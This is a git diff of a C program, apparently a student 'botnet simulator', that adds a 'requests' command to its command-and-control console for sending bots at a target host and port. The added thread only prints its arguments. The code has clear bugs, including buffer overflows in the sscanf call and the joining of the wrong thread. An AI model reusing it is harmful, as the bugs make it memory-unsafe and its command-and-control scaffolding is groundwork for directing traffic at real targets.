@@ -20,6 +20,8 @@ int start_server(int port);
 
 void *server_thread(void *arg);
 
+void *send_request_thread(void *args);
+
 void send_response(int client_socket, int status_code, const char *status_text, const char *response_text);
 
 char *get_formatted_server_info();
@@ -36,6 +38,13 @@ size_t write_callback(void *contents, size_t size, size_t nmemb, void *userp);
 
 void print_page_and_wait(const char *text);
 
+// Definizione di una struttura per passare i parametri al thread
+struct ThreadArgs {
+    char *targetHost;
+    char *targetPort;
+    char *client;
+};
+
 int main(int argc, char *argv[]) {
     if (argc != 2) {
         fprintf(stderr, "Usage: %s <port>\n", argv[0]);
@@ -50,7 +59,8 @@ int main(int argc, char *argv[]) {
         return 1;
     }
     //main thread
-    printf("Welcome to botnet!\n\nThis is a botnet simulator without any malicious purpose\n\nYou've got a running cnc listening on port %d\n\nType 'help' for a detailed list of commands available\n\n", port);
+    printf("Welcome to botnet!\n\nThis is a botnet simulator without any malicious purpose\n\nYou've got a running cnc listening on port %d\n\nType 'help' for a detailed list of commands available\n\n",
+           port);
     while (1) {
         printf("$ ");
         fflush(stdout);
@@ -88,8 +98,32 @@ int main(int argc, char *argv[]) {
             // request command
         else if (strcmp(command, "get status\n") == 0) {
             printf("get status!\n\n");
-        } else if (strncmp(command, "status", 8) == 0) {
-//            sendRequest(command);
+        } else if (strncmp(command, "requests", 8) == 0) {
+            char targetHost[256];
+            char targetPort[10];
+            char client[5];
+            int parsed = sscanf(command, "requests %255s %255s %255s", &targetHost, &targetPort, &client);
+
+            if (parsed != 3) {
+                printf(stderr, "Malformed command\n");
+                continue;
+            }
+
+            struct ThreadArgs *args = (struct ThreadArgs *) malloc(sizeof(struct ThreadArgs));
+            args->targetHost = strdup(targetHost);
+            args->targetPort = targetPort;
+            args->client = client;
+
+            pthread_t thread;
+            pthread_create(&thread, NULL, send_request_thread, args);
+
+            // Attendere la terminazione del thread
+            int *result;
+            if (pthread_join(server_thread_id, (void **) &result) != 0) {
+                perror("Error joining requests thread");
+                return 1;
+            }
+
         }
             // exit command
         else if (strcmp(command, "exit\n") == 0) {
@@ -113,6 +147,22 @@ void *server_thread(void *arg) {
     int port = *((int *) arg);
     int result = start_server(port);
     pthread_exit((void *) &result); // Passa l'intero direttamente senza cast
+}
+
+void *send_request_thread(void *args) {
+    struct ThreadArgs *threadArgs = (struct ThreadArgs *) args;
+    char *targetHost = threadArgs->targetHost;
+    char *targetPort = threadArgs->targetPort;
+    char *client = threadArgs->client;
+
+    printf("target %s\n", targetHost);
+    printf("port %s\n", targetPort);
+    printf("client %s\n", client);
+
+    free(targetHost);
+    free(threadArgs);
+
+    return NULL;
 }
 
 // Start server
@@ -530,7 +580,8 @@ void get_bot_info_request(const char *ip, const char *port_str) {
                 json_object_object_get_ex(json, "infoRAM", &memory_info) &&
                 json_object_object_get_ex(json, "infoNetwork", &network_info) &&
                 json_object_object_get_ex(json, "infoHD", &disk_info)) {
-                snprintf(info_str, sizeof(info_str), "OS Information: %s\n\nCPU Information: %s\n\nMemory Information: %s\n\nDisk Information: %s\n\nNetwork Information: %s\n",
+                snprintf(info_str, sizeof(info_str),
+                         "OS Information: %s\n\nCPU Information: %s\n\nMemory Information: %s\n\nDisk Information: %s\n\nNetwork Information: %s\n",
                          json_object_get_string(os_info),
                          json_object_get_string(cpu_info),
                          json_object_get_string(memory_info),
